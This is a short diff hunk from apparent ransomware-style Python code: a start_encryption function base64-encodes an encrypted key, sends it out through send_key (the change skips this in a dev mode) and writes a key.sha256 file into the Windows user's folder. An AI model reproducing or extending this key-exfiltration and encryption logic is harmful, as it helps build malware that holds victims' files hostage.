@@ -431,7 +431,7 @@ def start_encryption():
             "date": datetime.now().strftime("%d-%m-%Y"),
             "key": base64.b64encode(encrypted_key).decode(),
         }
-        send_key(data)
+        if not dev_mode: send_key(data)
         with open(
             os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256"), "wb"
         ) as f:
